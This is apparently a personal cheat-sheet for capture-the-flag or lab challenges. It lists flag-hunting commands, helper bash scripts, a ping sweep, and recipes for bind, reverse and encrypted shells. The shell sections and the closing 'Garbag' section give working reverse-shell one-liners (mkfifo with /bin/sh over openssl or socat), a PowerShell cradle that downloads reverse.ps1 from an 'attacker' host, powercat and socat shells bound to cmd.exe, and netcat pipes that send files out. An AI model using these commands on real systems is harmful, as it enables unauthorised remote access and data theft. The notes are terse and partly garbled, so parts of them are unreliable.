# NOT3Z :



    openssl req -newkey rsa:2048 -nodes -keyout ogkey.key -x509 -days 1000 -subj '/CN=www.target.com/O=PTAP./C=IN' -out ogkey.crt
    openssl req -x509 -newkey rsa:4096 -keyout certKey.pem -out certKey.pem -days 365 -nodes
    

#### find Xlag inside txt :
  
  `grep 'Xlag' . -lroE --include=*.txt*`
  
    
#### Pan Mages:    

          apropos -e "Xlag" -L /

#### Pan Mages:    

          locate pmgg 
          cat /usr/local/games/pmgg-notes.txt

#### Redirect:

          ./tras >> GameOver.tar
          tar -xzf GameOver.tar
          cd access-logs/
          cat *.* >> ALLin1.txt 
          cat ALLin1.txt | grep "PWK" 

#### Dirty Jobs :

    # Group name : hs - dj
    $Terminal 1 : 
    strings dj >> ~/output_GameOver.txt
    ./pf &
    ./gc &
    ./si &
    ./av &
    /problems/x/dj #<<<-- HIT ENTER 1 >#
    #OPEN ANOTHER TERMINAL : type 
    $Terminal 2 : 
    ps x
    kill -9 PID 
    # find pid of ( pf / gc / si / av ) kill proccess and go $Terminal 1 , hit enter find Xlag{Xlag}
    
#### PTAP Binarie :

    
    # download binaries file 
    # in your pc run : chmod +x binaries 
    # in your pc run : ./binaries 
    # You see half of Xlag .. 
    # now in Shell Server : run 
    cd /x/binaries
    strings binaries >> ~/binaries
    cd ~/
    chmod +x binaries
    ./binaries
    {XLAG}
    
#### Scriptname :
  
    vi printscriptname.sh
    #--------------START_OF_BASH----------------#
    #!/bin/bash
    echo $0
    #--------------END_OF_BASH----------------#
    chmod +x printscriptname.sh
    /x/scriptname ~/printscriptname.sh
    
    
#### Do I Exist                                    :

    vi doiexist.sh
    /x/do-i-exist ~/doiexist.sh
    #--------------START_OF_BASH----------------#
    #!/bin/bash
    if [ -f "$@" ]; then 
            echo "File exists"
    else
            echo "File does not exist"
    fi
    #--------------END_OF_BASH----------------#
    
    
#### Argument Count :
    
    vi argcoun.sh
    #--------------START_OF_BASH----------------#
    #!/bin/bash
    EXE=`basename $0`
    fnA()
    {
        echo "This script has $# arguments"
    }
    echo "This script has $# arguments"
    #--------------END_OF_BASH----------------#
    
    /x/argument ~/argcoun.sh
    {XLAG}
    
    
#### Access Log :
    
    vi fox.sh
    #--------------START_OF_BASH----------------#
    #!/bin/bash
    cat $1 | awk -F\" '{print $2}' | awk '{print $2}' | sed '/^$/d' | sed 's/\?.*//g' | sort | uniq | sort -rn | grep -oP '([a-zA-Z0-9\s_\\.\-\(\):]+\.[jJ][Ss])' | sort -u  | awk -F "/" '{print $NF}'
    #--------------END_OF_BASH----------------#
    
    vi xDigg.py
    #--------------START_OF_PYTHON----------------#
    #!/bin/python3
    import subprocess, sys 
    intsx=sys.argv[1]
    subprocess.run(["./fox.sh", "%s"%(intsx)])
    #--------------END_OF_PYTHON----------------#
   
    #run access-loog with xDigg.py 
    /x/access-log xDigg.py
    {Xlag}
    
    
#### Ping Sweep :

    vi pps.sh
    #--------------START_OF_BASH----------------#
    #!/bin/bash
    ip=$1
    IFS=. read ip1 ip2 ip3 ip4 <<< "$ip"
    theip="$ip1.$ip2.$ip3"
    i=$(( $2 - 1 ))
    countd=$(( $3 - 1 ))
    until [ $i -gt $countd ]
    do
        i=$(( $i + 1 ))
        ping $theip.$i -c 1 -w 1 | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"
    done
    #--------------END_OF_BASH----------------#
    ./pps.sh
    {Xlag}
    
    
#### Find the Password : 

  `tcp.stream eq 238`



    

#### Bind Shell connect to 4949 : 

    nc target.com 4949
    ls 
    flag.txt
    cat flag.txt
    {Xlag}
    
    
    
#### Reverse Shell connect to 1337 :    

    $Terminal 1 : 
      ./reverse-shell target.com 1337
    $Terminal 2 : 
      nc -l -v -p 1337
      cat flag.txt    
      {Xlag}
      
#### Transfer a File : 

    SHELL_WEB=A
    YOUR_LINUX=B
    Windows=C
    ####!!!! ON SERVER SHELL :!!!!!!!!!!!!!!
    cat database_file.exe >> XfileGameOver.txt
    cat XfileGameOver.txt | nc -v -l -p 55133
    
    ####!!!! ON YOUR LINUX :!!!!!!!!!!!!!!
    nc target.com 55133 > XfileGameOver.txt
    cat XfileGameOver.txt | nc -v -l -p 44155
    
    ####!!!! ON YOUR WINDOWS :!!!!!!!!!!!!!!
    nc 192.168.1.36 44155 > XfileGameOver.exe
    
        1 - setup administrator password ...!!
        
        2 - run cmd : 
              - net user Administrator /active:yes
              
        3 - open cmd as admin and run :        
              - runas /user:Administrator XfileGameOver.exe
    {XLAG}

#### Powerflag : 

    ./powerflag
    Import-Module powercat.ps1
    powercat -h
    powercat -l -p 11337 -e cmd.exe
    #[ B ] in your Windows or Linux CMD: type :
    nc target.com 11337
    {FLAG}


#### Group Membership : 

    #--------------START_OF_BASH----------------#
    #!/bin/bash 
    read -p "Please enter a username: " userXname
    read -p "Now enter a group: " groupXname
    groupswithSpace=$(echo $groupXname | tr ',' ' ')
    Do1=$( (cat /etc/passwd | grep "$userXname" | wc -c) )
    Do2=$( (cat /etc/group | grep "$groupswithSpace" | wc -c) )
    if [[ $Do1 > 1 && $Do2 > 1 ]];then msg="Membership valid!";fi
    if [[ $Do1 == 0 && $Do2 == 0 ]];then msg="Both are not found - why are you even asking me this?";fi
    if [[ $Do1 > 1 && $Do2 == 0 ]];then msg="One exists, one does not. You figure out which.";fi
    if [[ $Do1 == 0 && $Do2 > 1 ]];then msg="One exists, one does not. You figure out which.";fi
    echo $msg
    #--------------END_OF_BASH----------------#


#### Traffic Capture :

    #Download Xcapture on your LINUX : 
    
    chmod +x Xcapture
    strings Xcapture
    find user namd and password and type
    
    #On terminal type : 
    telnet target.com 43159
    
    #[ and paste this ]#:
    220 Fake Transfer Protocol (FTP) Service
    USER Xusername
    PASS XpasswordFound1234512345
    HELP
    SYST
    FLAG
    HELP
    QUIT
    {FLAG}


#### Encrypted Bind Shell :
    
    Your ip address : 5.5.5.5
    target.com + port ( 55441 )
    1 : connect to target with port 55441
    2 : connect from target to your ip
    
    $Terminal 1 (Linux) : 
      socat -d -d -d -d - OPENSSL:target.com:55441,cert=ogkey.pem,verify=0
          - find successfully connected from local address AF=2 5.5.5.5:91191 <-- use this port from target
    
    $Terminal 1 (target) : 
      socat -d -d -d -d OPENSSL:5.5.5.5:91191,verify=0 EXEC:/bin/rbash
    $Terminal 2 (target) :
      socat -d -d -d -d OPENSSL-LISTEN:1337,cert=ogkey.pem,verify=0 EXEC:/bin/rbash
    {XLAG}
      
      
#### Encrypted Reverse Shell : 

    A=attacker , T=target
    1 - $Terminal 1 (Linux) : openssl req -newkey rsa:2048 -nodes -keyout ogkey.key -x509 -days 1000 -subj '/CN=www.target.com/O=PTAP./C=IN' -out ogkey.crt
    2 - $Terminal 1 (Linux) : cat ogkey.key ogkey.crt > ogkey.pem
    3 - $Terminal 1 (Linux) : socat -d -d -d -d openssl-listen:1337,cert=ogkey.pem,verify=0,fork STDOUT
    4 - $Terminal 1 (target) : ./encrypted-reverse-shell 5.5.5.5 1337
    5 - $Terminal 1 (Linux) : ls -la
    6 - $Terminal 1 (Linux) : cat Xlat.txt
    {XLAG}
      
      
      
      
#### Garbag : 

    mkfifo /tmp/s; bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect target.com:50630 > /tmp/s; rm /tmp/s
    mkfifo /tmp/s; bin/sh -i < /tmp/s 2>&1 | socat -d -d OPENSSL:target.com:50630,verify=0,fork EXEC:/bin/rbash > /tmp/s; rm /tmp/s
    
    A-linux: stty raw -echo; (stty size; cat) | nc -lvnp 1337 -s target.com
    T-win: IEX(IWR http://attacker/reverse.ps1 -UseBasicParsing); Invoke-ConPtyShell 5.5.5.5 1337
    
    lsof -i :1337
    kill -9 1337
    
    ncat --ssl -l -p 33445
    ncat --ssl target.com 33445
    
    Linux: echo 'echo $0 | pwd | id | uname -a' > A_txt.txt
    Linux: ncat --send-only -lp 33445 < A_txt.txt
    Target: ncat --recv-only 5.5.5.5 33445 > A_txt.txt 
    Target: cat A_txt.txt
     
    tar cfp - pwd | compress -c | nc -w 3 192.168.1.34 51515
    
    #view other tty2  :
      ps -t 2
    
    #view group root  : 
      ps -G root
    
    #view background process cmd   :
      ps -p PID -ue
      ps -p PID -uge 
      ps -p PID -ufe 
      ps -gfe
      
      echo -e "GET status\nColumns: livestatus_version" | socat STDIO UNIX:/run/naemon/live
      
      
      
